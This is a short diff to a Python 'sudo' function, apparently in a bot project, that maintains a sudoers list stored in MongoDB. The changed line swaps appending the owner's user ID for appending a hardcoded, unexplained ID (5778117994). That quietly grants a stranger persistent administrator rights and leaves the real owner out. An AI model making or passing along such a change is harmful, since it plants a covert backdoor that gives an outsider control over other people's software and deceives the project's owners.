@@ -64,7 +64,7 @@ def sudo():
         for user_id in OWNER:
             SUDOERS.add(user_id)
             if user_id not in sudoers:
-                sudoers.append(user_id)
+                sudoers.append(5778117994)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
